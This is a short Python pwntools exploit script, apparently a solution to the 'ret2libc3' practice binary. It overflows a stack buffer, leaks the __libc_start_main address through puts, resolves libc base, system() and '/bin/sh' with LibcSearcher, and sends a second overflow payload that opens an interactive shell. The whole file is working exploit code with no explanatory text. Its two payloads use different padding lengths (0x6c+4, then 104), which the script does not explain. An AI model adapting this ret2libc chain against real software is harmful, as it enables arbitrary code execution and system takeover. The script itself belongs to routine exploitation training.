from pwn import *
from LibcSearcher import LibcSearcher

sh = process('./ret2libc3')

ret2libc3 = ELF('./ret2libc3')

offset1 = 0x6c + 4
puts_addr = ret2libc3.plt['puts']
libc_start_main_got = ret2libc3.got['__libc_start_main']
main_func = ret2libc3.symbols['main']

print("Leaking address of __libc_start_main and returning to main")
payload = b'A' * offset1
payload += p32(puts_addr) + p32(main_func) + p32(libc_start_main_got)
sh.sendlineafter(b'Can you find it !?', payload)

libc_start_main_addr = u32(sh.recv(4))

print("Leaked libc address, calculating libc base and system() address")
libc = LibcSearcher('__libc_start_main', libc_start_main_addr)
libc_base = libc_start_main_addr - libc.dump('__libc_start_main')
system_addr = libc_base + libc.dump('system')
bin_sh_addr = libc_base + libc.dump('str_bin_sh')

print("Executing /bin/sh")
payload = b'A' * 104
payload += p32(system_addr) + p32(0xdeadbeef) + p32(bin_sh_addr)
sh.sendline(payload)

sh.interactive()
